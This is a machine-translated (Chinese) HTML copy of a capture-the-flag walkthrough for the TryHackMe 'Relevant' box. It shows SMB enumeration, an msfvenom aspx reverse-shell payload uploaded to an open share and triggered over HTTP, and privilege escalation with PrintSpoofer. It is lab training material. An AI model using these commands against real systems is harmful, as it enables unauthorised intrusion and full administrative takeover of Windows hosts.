<html>
<head>
<title>Detailed Walkthrough on Relevant Box(THM)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">相关盒子(THM)的详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/detailed-walkthrough-on-relevant-box-thm-13fa7ae8d3e?source=collection_archive---------1-----------------------#2021-06-29">https://infosecwriteups.com/detailed-walkthrough-on-relevant-box-thm-13fa7ae8d3e?source=collection_archive---------1-----------------------#2021-06-29</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="6e2a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们解决来自Tryhackme的名为“相关”的盒子</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/a2e4e23a26fc35f10b54d1d6af628b73.png" data-original-src="https://miro.medium.com/v2/resize:fit:1276/format:webp/1*nJpB__La4wRTjHospj6yqg.png"/></div></figure><h1 id="01f1" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">渗透测试方法</h1><ol class=""><li id="203c" class="lr ls iq jp b jq lt ju lu jy lv kc lw kg lx kk ly lz ma mb bi translated"><strong class="jp ir">侦察</strong></li><li id="f9bf" class="lr ls iq jp b jq mc ju md jy me kc mf kg mg kk ly lz ma mb bi translated"><strong class="jp ir">枚举</strong></li><li id="c6a0" class="lr ls iq jp b jq mc ju md jy me kc mf kg mg kk ly lz ma mb bi translated"><strong class="jp ir">剥削</strong></li><li id="9f29" class="lr ls iq jp b jq mc ju md jy me kc mf kg mg kk ly lz ma mb bi translated"><strong class="jp ir">权限提升</strong></li></ol><p id="40eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在<a class="ae mh" href="https://tryhackme.com/room/relevant" rel="noopener ugc nofollow" target="_blank"> Tryhackme </a>访问此框</p><h1 id="cd62" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">侦察:-</h1><p id="af43" class="pw-post-body-paragraph jn jo iq jp b jq lt js jt ju lu jw jx jy mi ka kb kc mj ke kf kg mk ki kj kk ij bi translated">Nmap:- Nmap扫描显示5个端口是开放的，其中139(NetBios)和445(SMB)</p><p id="c91c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Netbios是一个允许不同计算机上的应用程序在局域网内通信的程序</p><p id="eea7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">SMB</strong>:-服务器消息块(SMB)是一种网络协议，使用户能够与远程计算机和服务器通信，以使用他们的资源或共享、打开和编辑文件。它也被称为服务器/客户机协议，因为服务器有一个可以与客户机共享的资源。</p><p id="972d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">中小企业如何运作？</strong></p><ul class=""><li id="116b" class="lr ls iq jp b jq jr ju jv jy ml kc mm kg mn kk mo lz ma mb bi translated">SMB协议通过来回发送多个请求-响应消息来创建服务器和客户端之间的连接</li><li id="5ac6" class="lr ls iq jp b jq mc ju md jy me kc mf kg mg kk mo lz ma mb bi translated">想象一下，你的团队正在处理一个大项目，这个项目涉及到很多来回。您可能希望能够共享和编辑存储在一个位置的文件。SMB协议将允许您的团队成员使用这些共享文件，就像它们在自己的硬盘上一样。即使他们中的一个人在世界的另一端出差，他们仍然可以访问和使用数据。</li><li id="6ef9" class="lr ls iq jp b jq mc ju md jy me kc mf kg mg kk mo lz ma mb bi translated">假设你办公室的打印机连接到接待员的电脑。如果您想要打印文档，您的计算机(客户端)会向接待员的计算机(服务器)发送打印请求，并使用SMB协议来完成打印。然后，服务器将发回一个响应，说明文件已排队、已打印，或者打印机用完了洋红色，无法执行任务。</li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mp"><img src="../Images/20963584c03d28d78f25269b6952e738.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Cls8Cg1eQsGTt2mV6L6KKA.png"/></div></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">Nmap</figcaption></figure><h1 id="f681" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">列举</h1><p id="569d" class="pw-post-body-paragraph jn jo iq jp b jq lt js jt ju lu jw jx jy mi ka kb kc mj ke kf kg mk ki kj kk ij bi translated">因为我们知道Smb是开放的，所以我们可以使用一个名为<code class="fe my mz na nb b">smbclient</code>的工具来列出连接到该网络的设备</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/02a8426f87cdc370b274cbc78f6277fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1250/format:webp/1*s8hX-CtaY5SZoW23othKUg.png"/></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">SMB客户端</figcaption></figure><ul class=""><li id="d1a8" class="lr ls iq jp b jq jr ju jv jy ml kc mm kg mn kk mo lz ma mb bi translated">由于有一个不常用的设备，我们可以转到该设备，现在我们已连接到smb</li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/c756968fda1a3753bf5ca539251548db.png" data-original-src="https://miro.medium.com/v2/resize:fit:944/format:webp/1*KKdrGCvktivuCCspea7Z1A.png"/></div></figure><ul class=""><li id="9b1e" class="lr ls iq jp b jq jr ju jv jy ml kc mm kg mn kk mo lz ma mb bi translated">当我们列出这个设备中的内容时，我们可以找到passwords.txt，它是base64编码的。</li></ul><p id="a83a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="ne">目录清单</em> :- </strong></p><ul class=""><li id="d7b8" class="lr ls iq jp b jq jr ju jv jy ml kc mm kg mn kk mo lz ma mb bi translated">虽然我们可以看到一个用户名和密码的兔子洞，但我们可以看到另一个端口(即3389)正在运行类似于端口80的web服务</li><li id="e272" class="lr ls iq jp b jq mc ju md jy me kc mf kg mg kk mo lz ma mb bi translated">如果我们在该端口上列出一个目录，我们可以看到一个目录<code class="fe my mz na nb b">nt4wrksv</code>处于打开状态，我们还可以看到一个同名的共享处于打开状态。所以如果我们做<code class="fe my mz na nb b">http:&lt;IP&gt;/nt4wrksv/passwords.txt</code>，它列出了那个文本文件的内容</li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi nf"><img src="../Images/3271eaa5be94db729366c5b1927253c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EZlgqTwFSWkfJaBhrpQoNQ.png"/></div></div></figure><ul class=""><li id="9523" class="lr ls iq jp b jq jr ju jv jy ml kc mm kg mn kk mo lz ma mb bi translated">因为我们可以访问内容，并且我们有上传权限，我们可以做的是上传一个aspx反向外壳并获取外壳</li><li id="c4fa" class="lr ls iq jp b jq mc ju md jy me kc mf kg mg kk mo lz ma mb bi translated">使用此命令<code class="fe my mz na nb b">msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;Your-IP&gt; LPORT=53 -f aspx -o rev.aspx</code>创建一个aspx shell</li><li id="78d4" class="lr ls iq jp b jq mc ju md jy me kc mf kg mg kk mo lz ma mb bi translated">如果我们做了<code class="fe my mz na nb b">put rev.aspx</code>，它会被下载到smb共享上</li><li id="ea64" class="lr ls iq jp b jq mc ju md jy me kc mf kg mg kk mo lz ma mb bi translated">然后，如果我们遍历到<code class="fe my mz na nb b">http://&lt;your-ip&gt;:3389/nt4wrksv/rev.aspx</code>并启动一个反向shell，我们就可以获得用户shell</li><li id="5ed4" class="lr ls iq jp b jq mc ju md jy me kc mf kg mg kk mo lz ma mb bi translated">如果我们执行这个命令<code class="fe my mz na nb b">type c:\users\bob\users.txt</code>会提供一个user.txt标志</li></ul><h1 id="e91e" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">特权升级</h1><ul class=""><li id="f06c" class="lr ls iq jp b jq lt ju lu jy lv kc lw kg lx kk mo lz ma mb bi translated">如果我们看到<code class="fe my mz na nb b">whoami /priv</code>，它将列出bob用户可以访问的所有权限</li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi ng"><img src="../Images/e01753580ce414201ca5b83cfcc5af3f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OTEjiih74VSU99l-JqIV2A.png"/></div></div></figure><ul class=""><li id="5109" class="lr ls iq jp b jq jr ju jv jy ml kc mm kg mn kk mo lz ma mb bi translated">如我们所见，有一个<code class="fe my mz na nb b">SeImpersonatePrevilige</code>设置为启用。我们可以使用名为<a class="ae mh" href="https://github.com/dievus/printspoofer" rel="noopener ugc nofollow" target="_blank"> printspoofer </a>的工具来获得root权限</li><li id="c74a" class="lr ls iq jp b jq mc ju md jy me kc mf kg mg kk mo lz ma mb bi translated">使用<code class="fe my mz na nb b">PrintSpoofer.exe -i -c cmd</code>获得root访问权限</li><li id="ad45" class="lr ls iq jp b jq mc ju md jy me kc mf kg mg kk mo lz ma mb bi translated">然后，如果我们遍历到/users/administrator/desktop/root . txt，我们可以找到根标志</li></ul></div></div>    
</body>
</html>